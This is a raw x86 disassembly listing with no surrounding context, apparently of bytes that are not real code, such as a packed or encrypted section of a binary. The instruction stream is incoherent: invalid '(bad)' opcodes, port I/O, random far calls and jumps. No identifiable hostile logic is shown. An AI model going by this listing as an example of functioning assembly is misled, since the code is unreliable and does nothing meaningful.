  40abb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abb1:	outs   dx,BYTE PTR ds:[esi]
  40abb2:	pusha  
  40abb3:	dec    eax
  40abb4:	inc    edx
  40abb5:	cmp    eax,DWORD PTR [ebx+edi*2]
  40abb8:	fidiv  WORD PTR [esi-0x7b08cadd]
  40abbe:	in     eax,dx
  40abbf:	mov    dl,0xcf
  40abc1:	daa    
  40abc2:	push   es
  40abc3:	nop
  40abc4:	pop    ds
  40abc5:	stos   DWORD PTR es:[edi],eax
  40abc6:	xor    eax,DWORD PTR [eax]
  40abc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abc9:	sbb    eax,0x949da69e
  40abce:	pop    edi
  40abcf:	mov    ?,WORD PTR [ecx]
  40abd1:	mov    cl,BYTE PTR [ecx]
  40abd3:	scas   al,BYTE PTR es:[edi]
  40abd4:	add    cl,BYTE PTR [edi-0x743404f4]
  40abda:	int3   
  40abdb:	loop   0x40ac32
  40abdd:	shr    BYTE PTR [esi],cl
  40abdf:	scas   eax,DWORD PTR es:[edi]
  40abe0:	add    BYTE PTR ds:0x8d38f1f0,dl
  40abe6:	aam    0xcc
  40abe8:	cmp    cl,BYTE PTR [ebp+0xb]
  40abeb:	lods   al,BYTE PTR ds:[esi]
  40abec:	(bad)  
  40abed:	jne    0x40ab7c
  40abef:	cmp    DWORD PTR [esp+eax*1-0x1028245b],esp
  40abf6:	imul   esi,DWORD PTR [edx-0x15],0x7d7205e4
  40abfd:	fdiv   DWORD PTR [ecx]
  40abff:	ss and eax,0xba449c12
  40ac05:	ret    
  40ac06:	call   0x25a1:0x65e2d279
  40ac0d:	jecxz  0x40ac21
  40ac0f:	sub    bl,al
  40ac11:	call   0x19df:0xcb4c4e56
  40ac18:	dec    BYTE PTR [edi+0x1ea5b5c6]
  40ac1e:	mov    cl,0xca
  40ac20:	dec    esp
  40ac21:	and    esp,ebp
  40ac23:	sbb    edx,ebp
  40ac25:	mov    ebx,0xa4e6aead
  40ac2a:	test   eax,0x6cf1bfb8
  40ac2f:	loopne 0x40ac95
  40ac31:	popa   
  40ac32:	daa    
  40ac33:	sbb    BYTE PTR ds:0xdebdee7a,0x1c
  40ac3a:	std    
  40ac3b:	jge    0x40ac42
  40ac3d:	in     al,0xb0
  40ac3f:	data16 in al,dx
  40ac41:	jns    0x40ac69
  40ac43:	pusha  
  40ac44:	sahf   
  40ac45:	mov    esp,0x2682910e
  40ac4a:	pop    esp
  40ac4b:	fsincos 
  40ac4d:	pop    eax
  40ac4e:	dec    edx
  40ac4f:	sahf   
  40ac50:	or     eax,0xc695ba0f
  40ac55:	and    esp,DWORD PTR [edi+0x15]
  40ac58:	push   0xa5bbd7ac
  40ac5d:	ror    DWORD PTR [ebp+0x43f13b60],1
  40ac63:	jmp    0x40acad
  40ac65:	and    DWORD PTR [edx],esi
  40ac67:	jne    0x40ac3e
  40ac69:	add    DWORD PTR [edx-0x7c],0xffffffa6
  40ac6d:	mov    eax,0x56d4ed41
  40ac72:	sbb    esi,DWORD PTR [ebp+ecx*2+0x66]
  40ac76:	vmaxsd xmm2,xmm2,xmm4
  40ac7a:	sbb    DWORD PTR [ebp-0x61],0x29
  40ac7e:	ficomp DWORD PTR [edx]
  40ac80:	ja     0x40acf5
  40ac82:	and    eax,0x489f5b71
  40ac87:	jbe    0x40ac6b
  40ac89:	into   
  40ac8a:	test   al,0x81
  40ac8c:	sub    al,BYTE PTR [esi+0x61]
  40ac8f:	addr16 popf 
  40ac91:	and    cl,ch
  40ac93:	dec    edx
  40ac94:	ins    BYTE PTR es:[edi],dx
  40ac95:	test   eax,0x43301d60
  40ac9a:	xlat   BYTE PTR ds:[ebx]
  40ac9b:	xchg   ebp,eax
  40ac9c:	dec    eax
  40ac9d:	scas   al,BYTE PTR es:[edi]
  40ac9e:	sub    DWORD PTR [edx-0x38],0x6ae1f9a6
  40aca5:	mov    esi,0x33b8188e
  40acaa:	dec    eax
  40acab:	sub    esi,DWORD PTR [esi]
  40acad:	in     eax,0xf1
  40acaf:	in     al,dx
  40acb0:	outs   dx,DWORD PTR ds:[esi]
  40acb1:	cdq    
  40acb2:	pop    ebx
  40acb3:	xor    al,0x6a
  40acb5:	lock push ss
  40acb7:	mov    esp,0xd04281f7
  40acbc:	mov    ebx,0xd447b4cd
  40acc1:	(bad)  ds:0x72faf9f6
  40acc7:	or     BYTE PTR [edi],bh
  40acc9:	ss and dl,bl
  40accc:	aaa    
  40accd:	mov    edi,0x50f45dc0
  40acd2:	adc    al,0xf6
  40acd4:	mov    bl,dl
  40acd6:	cld    
  40acd7:	push   ds
  40acd8:	mov    al,ds:0xb35d514c
  40acdd:	lods   al,BYTE PTR ds:[esi]
  40acde:	imul   esi,DWORD PTR [esi+0x2c38c003],0xc51c9a62
  40ace8:	fidiv  WORD PTR [ecx]
  40acea:	cdq    
  40aceb:	push   0x9def9183
  40acf0:	dec    eax
  40acf1:	fisubr WORD PTR [ecx+0x45]
  40acf4:	add    eax,0x4a6d336
  40acf9:	inc    al
  40acfb:	stos   BYTE PTR es:[di],al
  40acfd:	adc    al,0xaa
  40acff:	and    dh,dh
  40ad01:	adc    ah,BYTE PTR [edi]
  40ad03:	loope  0x40ace5
  40ad05:	pop    eax
  40ad06:	push   esi
  40ad07:	(bad)  
  40ad08:	mov    eax,0xabe3419
  40ad0d:	jl     0x40acb2
  40ad0f:	sbb    BYTE PTR ds:0xe4219a5a,0xb1
  40ad16:	push   ebx
  40ad17:	inc    esp
  40ad18:	outs   dx,DWORD PTR ds:[esi]
  40ad19:	mov    ebp,0x8a124f09
  40ad1e:	je     0x40ace1
  40ad20:	call   0xba3c:0x6aac5979
  40ad27:	adc    eax,0xedd3f58
  40ad2c:	mov    ds:0xec5eb7f5,eax
  40ad31:	pushf  
  40ad32:	jo     0x40ad84
  40ad34:	mov    WORD PTR [esi+0x2a],es
  40ad37:	sahf   
  40ad38:	cs in  eax,dx
  40ad3a:	or     edi,edi
  40ad3c:	sub    edi,DWORD PTR [edx+edi*4-0x4d23b61f]
  40ad43:	xchg   esi,eax
  40ad44:	jne    0x40ace9
  40ad46:	push   ebx
  40ad47:	loop   0x40ad51
  40ad49:	push   cs
  40ad4a:	jno    0x40ad41
  40ad4c:	jnp    0x40ad66
  40ad4e:	adc    DWORD PTR [edx+0x5b],edi
  40ad51:	cmp    BYTE PTR [esi+0x15],dl
  40ad54:	enter  0x4909,0xb4
  40ad58:	out    dx,al
  40ad59:	in     eax,0x82
  40ad5b:	retf   0x1ce7
  40ad5e:	jge    0x40ad7f
  40ad60:	mov    eax,ds:0xf4f97b05
  40ad65:	inc    eax
  40ad66:	call   0xcbc1:0x8c87edf0
  40ad6d:	mov    eax,ds:0x67b8c662
  40ad72:	sub    DWORD PTR [ebp+0x47],ecx
  40ad75:	mov    eax,0x936d7c8a
  40ad7a:	fst    QWORD PTR [edi]
  40ad7c:	jb     0x40adef
  40ad7e:	outs   dx,BYTE PTR ds:[esi]
  40ad7f:	(bad)  
  40ad80:	rol    BYTE PTR [edx-0x29],1
  40ad83:	push   cs
  40ad84:	loop   0x40ad54
  40ad86:	mov    ax,ds:0xcdefd12a
  40ad8c:	or     DWORD PTR [esi+0x68bebdd],esp
  40ad92:	fstp   DWORD PTR [esi]
  40ad94:	jnp    0x40adb6
  40ad96:	or     bl,al
  40ad98:	cmp    esi,edx
  40ad9a:	push   ebp
  40ad9b:	test   dh,bh
  40ad9d:	mov    ah,0x8e
  40ad9f:	out    dx,eax
  40ada0:	frstor [ebx+0x6ddfaca2]
  40ada6:	rcr    DWORD PTR [esp+ebx*8+0x11a28bfb],1
  40adad:	push   0x83cf970d
  40adb2:	mov    ebp,0xed9692ad
  40adb7:	lock in al,0x5c
  40adba:	mov    cl,0x67
  40adbc:	outs   dx,BYTE PTR ds:[esi]
  40adbd:	mov    ebp,0x44d7e30c
  40adc2:	lea    esp,[ebp+0x6e]
  40adc5:	sbb    ah,0xd9
  40adc8:	std    
  40adc9:	sahf   
  40adca:	popa   
  40adcb:	(bad)  [eax+edx*2]
  40adce:	jecxz  0x40ad83
  40add0:	fwait
  40add1:	or     edx,0x38
  40add4:	inc    ebx
  40add5:	inc    esp
  40add6:	push   cs
  40add7:	xchg   edi,edi
  40add9:	jl     0x40adbc
  40addb:	inc    ecx
  40addc:	mov    ecx,0x48e7bddf
  40ade1:	cdq    
  40ade2:	pushw  ds
  40ade4:	adc    esp,DWORD PTR [esi-0x18]
  40ade7:	loopne 0x40ae10
  40ade9:	jmp    0x826a4657
  40adee:	xor    eax,0xb90639af
  40adf3:	add    ch,BYTE PTR [edx-0x6970b81]
  40adf9:	sbb    DWORD PTR [edi+0xba4699a],edx
  40adff:	dec    ecx
  40ae00:	xor    ecx,DWORD PTR [ecx-0x16c448f4]
  40ae06:	int    0x72
  40ae08:	mov    edx,0x1a48025d
  40ae0d:	adc    eax,0xa42b449f
  40ae12:	mov    ds:0x11905f11,al
  40ae17:	add    bl,BYTE PTR [eax]
  40ae19:	jle    0x40adf4
  40ae1b:	push   0xffffffcd
  40ae1d:	and    esi,esp
  40ae1f:	out    0x36,eax
  40ae21:	mov    ecx,0x7b6361d8
  40ae26:	or     bl,al
  40ae28:	stos   BYTE PTR es:[edi],al
  40ae29:	mov    eax,0x20f5865c
  40ae2e:	jno    0x40adf3
  40ae30:	lods   al,BYTE PTR ds:[esi]
  40ae31:	mov    dh,0x2a
  40ae33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae34:	jmp    0x1197:0xd8b69c86
  40ae3b:	push   0x7e
  40ae3d:	mov    bl,0x97
  40ae3f:	in     eax,dx
  40ae40:	(bad)  
  40ae41:	shl    DWORD PTR [esi+0xdbf41a7],1
  40ae47:	xchg   DWORD PTR [edi-0x5e5bdfb3],ecx
  40ae4d:	sahf   
  40ae4e:	sbb    DWORD PTR [edx+0x45],0x3d9f5ba1
  40ae55:	cmp    edx,DWORD PTR [ecx+0x16105bec]
  40ae5b:	add    al,0x6
  40ae5d:	das    
  40ae5e:	dec    esi
  40ae5f:	inc    esi
  40ae60:	pushf  
  40ae61:	add    ecx,DWORD PTR [eax]
  40ae63:	inc    edx
  40ae64:	arpl   WORD PTR [ecx-0x2eb61074],si
  40ae6a:	pop    edx
  40ae6b:	js     0x40aec3
  40ae6d:	fwait
  40ae6e:	leave  
  40ae6f:	dec    BYTE PTR [edx]
  40ae71:	enter  0x1a18,0x91
  40ae75:	xchg   edi,eax
  40ae76:	in     eax,dx
  40ae77:	and    ecx,DWORD PTR [ecx+0x56]
  40ae7a:	enter  0x9390,0x68
  40ae7e:	les    ebx,FWORD PTR [eax+ebp*2]
  40ae81:	mov    eax,0x6f72397
  40ae86:	(bad)  
  40ae87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae88:	js     0x40ae4b
  40ae8a:	arpl   ax,cx
  40ae8c:	imul   ebx,ecx,0x7b04511d
  40ae92:	sub    DWORD PTR [ebp+0x40e68d50],esi
  40ae98:	imul   eax,ebx,0xffffffda
  40ae9b:	vsubps ymm5,ymm2,ymm5
  40ae9f:	fst    DWORD PTR [ebx]
  40aea1:	stc    
  40aea2:	mov    ds:0x6d6f88d7,al
  40aea7:	icebp  
  40aea8:	fbstp  TBYTE PTR [edx]
  40aeaa:	inc    ebx
  40aeab:	in     ax,0x74
  40aeae:	add    cl,BYTE PTR [esi]
  40aeb0:	jne    0x40ae79
  40aeb2:	xor    edx,DWORD PTR [ebp-0x53]
  40aeb5:	mov    edx,0x662e11e4
  40aeba:	ficom  WORD PTR [edx-0x6c]
  40aebd:	icebp  
  40aebe:	lds    ebp,FWORD PTR [ebx+0x1]
  40aec1:	push   eax
  40aec2:	popf   
  40aec3:	in     eax,dx
  40aec4:	sbb    edi,eax
  40aec6:	hlt    
  40aec7:	bound  edx,QWORD PTR [ecx-0x7c]
  40aeca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aecb:	in     al,dx
  40aecc:	mov    eax,ds:0x82f0a6d
  40aed1:	mov    ebx,0x4c3eb801
  40aed6:	sub    DWORD PTR fs:[edx],esi
  40aed9:	xor    DWORD PTR [esi-0x78],ebx
  40aedc:	addr16 xchg edx,eax
  40aede:	jo     0x40af5c
  40aee0:	jne    0x40ae80
  40aee2:	(bad)  
  40aee3:	outs   dx,DWORD PTR ds:[esi]
  40aee4:	jns    0x40ae92
  40aee6:	sbb    BYTE PTR [ecx-0x3b19380c],cl
  40aeec:	mov    al,ds:0x71ef45c8
  40aef1:	and    al,ah
  40aef3:	inc    esi
  40aef4:	cmc    
  40aef5:	call   0x5254:0x28d9946c
  40aefc:	aas    
  40aefd:	sbb    BYTE PTR [eax],dl
  40aeff:	cmp    ch,dl
  40af01:	adc    al,0x96
  40af03:	fdivr  st,st(1)
  40af05:	(bad)  
  40af06:	jmp    0x40af4f
  40af08:	pop    ecx
  40af09:	mov    dh,0x43
  40af0b:	xor    edx,DWORD PTR [edi]
  40af0d:	mov    esp,0x3d27fb04
  40af12:	fisubr DWORD PTR [edx]
  40af14:	in     al,0x65
  40af16:	out    dx,eax
  40af17:	das    
  40af18:	jae    0x40aebd
  40af1a:	jnp    0x40aee0
  40af1c:	xchg   bl,cl
  40af1e:	out    dx,eax
  40af1f:	adc    edx,DWORD PTR [ecx]
  40af21:	xchg   BYTE PTR [edi],dl
  40af23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af24:	xchg   edx,eax
  40af25:	jl     0x40aedf
  40af27:	loopne 0x40af69
  40af29:	xchg   edi,eax
  40af2a:	ss sbb eax,0x1fcc9588
  40af30:	jmp    0x638e07ae
  40af35:	mov    al,0xe8
  40af37:	inc    eax
  40af38:	(bad)  
  40af39:	lea    ebp,[ebx-0x6f061e2e]
  40af3f:	jge    0x40af94
  40af41:	adc    ebp,edi
  40af43:	xor    cl,dl
  40af45:	in     al,0x55
  40af47:	pop    es
  40af48:	dec    ebx
  40af49:	or     edx,DWORD PTR [edx+edx*2-0x7235f00d]
  40af50:	cmp    DWORD PTR [esi+eiz*4],0x57
  40af54:	js     0x40af9f
  40af56:	mov    dl,0x38
  40af58:	rep stos DWORD PTR es:[edi],eax
  40af5a:	dec    ecx
  40af5b:	xchg   ecx,eax
  40af5c:	xor    al,0xf8
  40af5e:	rcr    DWORD PTR [edi+0x56352b08],0xbe
  40af65:	out    dx,eax
  40af66:	das    
  40af67:	cld    
  40af68:	sub    cl,bh
  40af6a:	ins    BYTE PTR es:[edi],dx
  40af6b:	arpl   si,ax
  40af6d:	mov    ch,0x20
  40af6f:	push   0x4550d965
  40af74:	jnp    0x40af77
  40af76:	test   DWORD PTR [ecx],esi
  40af78:	xor    BYTE PTR [edx-0x79],0x4a
  40af7c:	ds mov ah,ch
  40af7f:	js     0x40af98
  40af81:	stos   WORD PTR es:[edi],ax
  40af83:	mov    WORD PTR ds:0xdc712429,fs
  40af89:	mov    ecx,0xc454e832
  40af8e:	mov    ds:0xee712399,eax
  40af93:	mov    bh,0x3
  40af95:	outs   dx,DWORD PTR ds:[esi]
  40af96:	out    dx,eax
  40af97:	mov    esi,0x7a260775
  40af9c:	inc    ecx
  40af9d:	jb     0x40af6c
  40af9f:	and    al,0x53
  40afa1:	pop    ecx
  40afa2:	xchg   esi,eax
  40afa3:	lea    esi,[esi+0x7aeebf6f]
  40afa9:	loop   0x40afad
  40afab:	scas   al,BYTE PTR es:[edi]
  40afac:	cmp    ebp,DWORD PTR [edx+0x3d190cc8]
  40afb2:	fsub   QWORD PTR [eax]
  40afb4:	xchg   ecx,eax
  40afb5:	pop    ds
  40afb6:	xchg   esp,eax
  40afb7:	aas    
  40afb8:	and    ebx,DWORD PTR [esi-0x9896f51]
  40afbe:	retf   
  40afbf:	mov    ebx,0x6322b6c9
  40afc4:	add    esi,ebx
  40afc6:	pop    ss
  40afc7:	xchg   BYTE PTR [esi-0x57],al
  40afca:	loopne 0x40af62
  40afcc:	outs   dx,BYTE PTR ds:[esi]
  40afcd:	(bad)
  40afd0:	xchg   edi,eax
  40afd1:	dec    ecx
  40afd2:	add    DWORD PTR [esi],esi
  40afd4:	push   edi
  40afd5:	enter  0x6928,0xaf
  40afd9:	mov    ah,0xe2
  40afdb:	xor    eax,0x6671074f
  40afe0:	mov    ebx,0xb6d6afa7
  40afe5:	sub    BYTE PTR [ebx],al
  40afe7:	push   edi
  40afe8:	sbb    BYTE PTR [ebp+0x4644d7bb],0x74
  40afef:	fwait
  40aff0:	pop    ds
  40aff1:	push   ecx
  40aff2:	add    eax,DWORD PTR [eax+eax*8]
  40aff5:	jnp    0x40b052
  40aff7:	fwait
  40aff8:	in     al,0xa0
  40affa:	and    bl,cl
  40affc:	rcr    DWORD PTR [esi-0x12b3771e],cl
  40b002:	mov    eax,0x6e7fb3dd
  40b007:	ret    
  40b008:	dec    edi
  40b009:	or     bh,BYTE PTR [ebp+0x497250b1]
  40b00f:	rcr    BYTE PTR [ecx],1
  40b011:	lds    esi,FWORD PTR [eax]
  40b013:	sysret 
  40b015:	je     0x40afb0
  40b017:	mov    edi,DWORD PTR [esi+0x38567a04]
  40b01d:	les    ecx,FWORD PTR [eax-0x5a]
  40b020:	jo     0x40afd1
  40b022:	or     DWORD PTR [ebx],esi
  40b024:	pop    ecx
  40b025:	fstp   DWORD PTR [ebx+edi*2-0x6e7d8456]
  40b02c:	mov    edi,0x2a9df5b4
  40b031:	jle    0x40b023
  40b033:	aas    
  40b034:	fwait
  40b035:	xor    al,0x34
  40b037:	xchg   ebx,eax
  40b038:	sub    ch,cl
  40b03a:	mov    ecx,0x1cc1ff11
  40b03f:	push   cs
  40b040:	sar    BYTE PTR es:[ebx+0x453d879],cl
  40b047:	and    esi,0xffffff90
  40b04a:	add    dl,BYTE PTR [eax+0x2e]
  40b04d:	xchg   edx,eax
  40b04e:	std    
  40b04f:	icebp  
  40b050:	jmp    0x1c6dd6fe
  40b055:	pop    edi
  40b056:	cmp    bl,ah
  40b058:	ret    0xc9e6
  40b05b:	fwait
  40b05c:	test   al,0x86
  40b05e:	cdq    
  40b05f:	jge    0x40b09a
  40b061:	retf   
  40b062:	push   edx
  40b063:	and    eax,0xaa0c7ac7
  40b068:	adc    al,0x46
  40b06a:	push   0x31c2a66e
  40b06f:	fistp  QWORD PTR ds:0xe00a1a92
  40b075:	jae    0x40b0a1
  40b077:	neg    BYTE PTR fs:[ebx+0x54f15bb0]
  40b07e:	(bad)  
  40b07f:	loopne 0x40b03a
  40b081:	mov    eax,ds:0xc8027666
  40b086:	ds or  al,0x92
  40b089:	sub    eax,0x4cd1f378
  40b08e:	les    ebx,FWORD PTR [ebx-0x31522676]
  40b094:	repnz inc edi
  40b096:	test   DWORD PTR [edi+0x22],eax
  40b099:	lods   eax,DWORD PTR ds:[esi]
  40b09a:	mov    DWORD PTR [eax+0xb6f95bb],ebp
  40b0a0:	jmp    0x40b0e0
  40b0a2:	scas   al,BYTE PTR es:[edi]
  40b0a3:	enter  0x3013,0x6a
  40b0a7:	push   es
  40b0a8:	popf   
  40b0a9:	(bad)  
  40b0aa:	in     al,dx
  40b0ab:	push   ecx
  40b0ac:	add    ebp,DWORD PTR [edi+0x2d]
  40b0af:	adc    eax,0x697aa942
  40b0b4:	mov    esi,0x943fd00b
  40b0b9:	inc    edx
  40b0ba:	in     al,0x20
  40b0bc:	addr16 jnp 0x40b0cd
  40b0bf:	cmc    
  40b0c0:	(bad)  
  40b0c1:	mov    cl,0x4
  40b0c3:	out    dx,al
  40b0c4:	mov    esp,0xff0a1255
  40b0c9:	inc    edx
  40b0ca:	add    eax,0xb002863
  40b0cf:	jp     0x40b112
  40b0d1:	xor    eax,0xb06f87d4
  40b0d6:	xor    BYTE PTR [ecx],bh
  40b0d8:	dec    esp
  40b0d9:	inc    ebp
  40b0da:	push   ecx
  40b0db:	adc    edx,edx
  40b0dd:	xor    BYTE PTR [esi+0x59],dl
  40b0e0:	std    
  40b0e1:	cmp    ah,BYTE PTR [ebx-0x6d]
  40b0e4:	jns    0x40b0aa
  40b0e6:	and    DWORD PTR [ebp+0x2032e084],ebx
  40b0ec:	aad    0x18
  40b0ee:	(bad)  
  40b0ef:	ins    BYTE PTR es:[edi],dx
  40b0f0:	mov    esi,0xae7606f7
  40b0f5:	rcr    ch,cl
  40b0f7:	pop    esp
  40b0f8:	cmp    al,ah
  40b0fa:	repz add DWORD PTR [ecx-0x2b27e5b7],edi
  40b101:	xchg   edi,eax
  40b102:	into   
  40b103:	xor    al,0xd8
  40b105:	xor    cl,BYTE PTR [ebx+eax*2+0x43]
  40b109:	mov    esp,0xe11b700e
  40b10e:	enter  0x1d7,0x74
  40b112:	push   eax
  40b113:	into   
  40b114:	jp     0x40b113
  40b116:	inc    ebx
  40b117:	stos   BYTE PTR es:[edi],al
  40b118:	jns    0x40b18b
  40b11a:	fwait
  40b11b:	(bad)  
  40b11c:	jmp    0x40b0e5
  40b11e:	pop    eax
  40b11f:	push   esp
  40b120:	jbe    0x40b1a1
  40b122:	adc    al,0xfd
  40b124:	ins    BYTE PTR es:[edi],dx
  40b125:	jecxz  0x40b14b
  40b127:	or     eax,0x6a348248
  40b12c:	mov    bl,BYTE PTR [ebx+0x9]
  40b12f:	mov    eax,0xb1cc75c6
  40b134:	dec    ebp
  40b135:	shl    DWORD PTR [esi],1
  40b137:	cmp    al,BYTE PTR [esi+0xa43102f]
  40b13d:	addr16 xor ebp,eax
  40b140:	cmc    
  40b141:	mov    al,0x55
  40b143:	jo     0x40b160
  40b145:	imul   eax,ecx,0x49
  40b148:	sbb    eax,0xc6af3ec0
  40b14d:	and    dl,BYTE PTR [esi-0x159975b]
  40b153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b154:	scas   al,BYTE PTR es:[edi]
  40b155:	pushf  
  40b156:	mov    ch,0xa5
  40b158:	adc    esi,ecx
  40b15a:	icebp  
  40b15b:	out    dx,eax
  40b15c:	loope  0x40b1bc
  40b15e:	mov    ah,0x11
  40b160:	push   cs
  40b161:	adc    BYTE PTR [edx],dh
  40b163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b164:	dec    edi
  40b165:	cld    
  40b166:	or     BYTE PTR [edx+0x74],ah
  40b169:	test   dh,dh
  40b16b:	inc    esp
  40b16c:	or     bl,ch
  40b16e:	shl    DWORD PTR ds:0xb262c3cf,1
  40b174:	dec    eax
  40b175:	xchg   edi,eax
  40b176:	rol    esp,0xd4
  40b179:	xor    eax,0x178744e9
  40b17e:	cwde   
  40b17f:	sbb    DWORD PTR [eax],0x7d
  40b182:	add    eax,ebp
  40b184:	xor    eax,0xd8121823
  40b189:	mov    eax,DWORD PTR [eax+0x373429cb]
  40b18f:	mov    ds:0xe6501e2a,al
  40b194:	hlt    
  40b195:	dec    edx
  40b196:	test   eax,0x4d542da3
  40b19b:	addr16 iret 
  40b19d:	call   0xaad1269b
  40b1a2:	mov    eax,ds:0x794fa316
  40b1a7:	test   BYTE PTR [edi-0x61],bh
  40b1aa:	or     al,0xdd
  40b1ac:	test   BYTE PTR [ebp+0x4],bh
  40b1af:	lods   eax,DWORD PTR ds:[esi]
  40b1b0:	mov    edx,0x3f7bf040
  40b1b5:	add    esp,esi
  40b1b7:	pop    ss
  40b1b8:	xchg   edi,eax
  40b1b9:	cs (bad) 
  40b1bb:	loop   0x40b1b2
  40b1bd:	mov    ?,ebx
  40b1bf:	jb     0x40b227
  40b1c1:	in     al,0x25
  40b1c3:	ja     0x40b181
  40b1c5:	out    dx,al
  40b1c6:	mov    esp,0x5bbb4485
  40b1cb:	cmp    edx,esi
  40b1cd:	stc    
  40b1ce:	fdiv   st,st(6)
  40b1d0:	mov    ds:0xdb57c6b5,al
  40b1d5:	mov    dh,0x93
  40b1d7:	sub    BYTE PTR [esi+0x457ef845],0x5a
  40b1de:	(bad)  
  40b1e0:	call   0xb255:0x85165233
  40b1e7:	add    cl,BYTE PTR [ebx-0x6d]
  40b1ea:	or     al,0xfd
  40b1ec:	mov    ebp,DWORD PTR [eax-0x66]
  40b1ef:	icebp  
  40b1f0:	cmp    DWORD PTR [eax],esi
  40b1f2:	dec    esi
  40b1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1f4:	sbb    bl,BYTE PTR [ecx+0x491e055b]
  40b1fa:	jl     0x40b1b0
  40b1fc:	mov    ebp,0x6071c90d
  40b201:	jle    0x40b273
  40b203:	int    0xab
  40b205:	popf   
  40b206:	mov    al,ds:0x909dc6bc
  40b20b:	dec    esi
  40b20c:	in     al,0xfd
  40b20e:	mov    ebx,DWORD PTR [eax]
  40b210:	xchg   DWORD PTR [edx],ebp
  40b212:	outs   dx,BYTE PTR ds:[esi]
  40b213:	pop    eax
  40b214:	inc    ebp
  40b215:	sub    eax,0xd4ecda1a
  40b21a:	in     al,0x14
  40b21c:	test   al,0x63
  40b21e:	pop    ds
  40b21f:	dec    edx
  40b220:	cmp    DWORD PTR [esi],ecx
  40b222:	int3   
  40b223:	mov    bh,0xea
  40b225:	sub    DWORD PTR [si],esi
  40b228:	test   dh,bh
  40b22a:	and    al,0x6c
  40b22c:	mov    ax,0x9522
  40b230:	shl    BYTE PTR [ebx-0x4ea8ab66],1
  40b236:	dec    esp
  40b237:	cmp    DWORD PTR [ebp+eiz*4+0x130b4672],ebx
  40b23e:	push   0xffffffac
  40b240:	in     al,dx
  40b241:	iret   
  40b242:	mov    ch,0x3a
  40b244:	dec    esi
  40b245:	jnp    0x40b218
  40b247:	push   es
  40b248:	rcl    DWORD PTR ds:0x1e5020c1,1
  40b24e:	add    ebx,DWORD PTR gs:[eax+edi*8]
  40b252:	gs sti 
  40b254:	nop
  40b255:	shl    BYTE PTR [edx+0x15fe4045],1
  40b25b:	sub    eax,0xcdf91321
  40b260:	mov    esi,eax
  40b262:	call   0xd1ef:0x907616fb
  40b269:	pusha  
  40b26a:	arpl   WORD PTR [ebx],di
  40b26c:	fsubr  DWORD PTR [edi]
  40b26e:	adc    DWORD PTR [esi-0x2d0554ed],0x2
  40b275:	push   esp
  40b276:	repz sbb BYTE PTR [edx+0x35a8c6b4],ch
  40b27d:	push   esp
  40b27e:	xchg   ebp,eax
  40b27f:	out    dx,eax
  40b280:	ds test eax,0x2c3da04c
  40b286:	retf   0x28a5
  40b289:	add    al,BYTE PTR [ecx+0x7a246cf1]
  40b28f:	(bad)  
  40b290:	xchg   esi,eax
  40b291:	jecxz  0x40b27c
  40b293:	in     al,0x1c
  40b295:	dec    edi
  40b296:	jno    0x40b258
  40b298:	into   
  40b299:	popa   
  40b29a:	out    dx,eax
  40b29b:	jbe    0x40b271
  40b29d:	mov    ebx,0x8202cbf8
  40b2a2:	xchg   edx,eax
  40b2a3:	ja     0x40b2e9
  40b2a5:	je     0x40b2b9
  40b2a7:	xor    dh,al
  40b2a9:	scas   eax,DWORD PTR es:[edi]
  40b2aa:	mov    ebp,0x653238e9
  40b2af:	and    BYTE PTR [ecx],cl
  40b2b1:	mov    BYTE PTR [edx],ah
  40b2b3:	add    al,0xaa
  40b2b5:	adc    al,0xa0
  40b2b7:	sbb    BYTE PTR [edi-0x80],dh
  40b2ba:	adc    al,0xa5
  40b2bc:	mov    ebx,0x44553597
  40b2c1:	adc    DWORD PTR [esi],edx
  40b2c3:	fwait
  40b2c4:	in     eax,0x1f
  40b2c6:	push   ss
  40b2c7:	mov    bh,0xad
  40b2c9:	xlat   BYTE PTR ds:[ebx]
  40b2ca:	stc    
  40b2cb:	scas   al,BYTE PTR es:[edi]
  40b2cc:	int3   
  40b2cd:	pop    eax
  40b2ce:	dec    edi
  40b2cf:	popa   
  40b2d0:	push   es
  40b2d1:	iret   
  40b2d2:	gs xor edx,ebx
  40b2d5:	dec    edi
  40b2d6:	lahf   
  40b2d7:	cmp    al,0xcb
  40b2d9:	cmp    bl,BYTE PTR [eax-0x75]
  40b2dc:	xchg   edi,eax
  40b2dd:	popa   
  40b2de:	cs daa 
  40b2e0:	ja     0x40b30a
  40b2e2:	push   cs
  40b2e3:	arpl   WORD PTR [edi+0x2d],cx
  40b2e6:	adc    DWORD PTR [ebx+0x46f77671],edi
  40b2ec:	mov    esp,0xfc9ab0b9
  40b2f1:	xor    BYTE PTR [eax-0x2d],bl
  40b2f4:	fwait
  40b2f5:	imul   edi,DWORD PTR [edx+0x70],0xfffffff7
  40b2f9:	jle    0x40b2f0
  40b2fb:	dec    edi
  40b2fc:	dec    esi
  40b2fd:	cli    
  40b2fe:	test   DWORD PTR [ecx],esi
  40b300:	(bad)  
  40b301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b302:	mov    dh,0xf6
  40b304:	rol    DWORD PTR [edi],cl
  40b306:	les    ecx,FWORD PTR ss:[eax+0x54]
  40b30a:	arpl   WORD PTR [esi],di
  40b30c:	lea    eax,[edx-0x40]
  40b30f:	lds    ebx,FWORD PTR [ebp+esi*4-0x20]
  40b313:	loope  0x40b341
  40b315:	popf   
  40b316:	popf   
  40b317:	xchg   BYTE PTR [edi-0x1b],dh
  40b31a:	adc    ebp,DWORD PTR [ebx]
  40b31c:	jns    0x40b2f3
  40b31e:	pop    es
  40b31f:	mov    ah,0xf9
  40b321:	in     al,dx
  40b322:	sbb    bl,bl
  40b324:	sub    edx,DWORD PTR [ecx-0x3a2d3ffa]
  40b32a:	stos   DWORD PTR es:[edi],eax
  40b32b:	jmp    0xb64c8734
  40b330:	out    0x89,al
  40b332:	add    edx,esp
  40b334:	add    BYTE PTR [edi+0x39],0xdb
  40b338:	stos   BYTE PTR es:[edi],al
  40b339:	ins    DWORD PTR es:[edi],dx
  40b33a:	jb     0x40b314
